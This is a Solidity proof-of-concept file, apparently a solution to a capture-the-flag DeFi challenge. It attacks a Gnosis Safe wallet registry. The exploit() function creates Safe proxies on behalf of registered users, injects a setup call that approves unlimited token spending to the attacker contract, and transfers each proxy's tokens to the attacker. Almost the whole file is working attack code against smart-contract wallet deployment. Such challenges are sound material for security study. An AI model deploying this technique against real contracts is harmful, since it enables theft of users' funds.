// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./WalletRegistry.sol";
import "@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/IProxyCreationCallback.sol";

contract Helper {
    function approve(address token, address player) public {
        IERC20(token).approve(player, type(uint256).max);
    }
}

contract Wallet_POC {
    GnosisSafeProxyFactory public immutable fac;
    GnosisSafe public immutable safe;
    WalletRegistry public immutable reg;
    IERC20 public immutable token;

    Helper public immutable helper;

    address public immutable player;
    address[] public users;

    constructor(
        GnosisSafeProxyFactory _fac, 
        GnosisSafe _safe, 
        WalletRegistry _reg, 
        IERC20 _token,
        address[] memory _users
        ) {
            helper = new Helper();
            player = msg.sender;
            fac = _fac;
            safe = _safe;
            reg = _reg;
            token = _token;
            users = _users;
    }

    function exploit() external {
        for (uint256 i = 0; i < users.length; i++) {

            address[] memory owners = new address[](1);
            owners[0] = users[i];

            bytes memory initdata = abi.encodeCall(GnosisSafe.setup, (
                owners,
                1,
                address(helper),
                abi.encodeCall(Helper.approve, (address(token), address(this))),
                address(0),
                address(0),
                0,
                payable(address(0))
            ));

            address proxy = address(fac.createProxyWithCallback(
                address(safe),
                initdata,
                0,
                reg
            ));

            token.transferFrom(proxy, player, token.balanceOf(proxy));
        }    
    }
}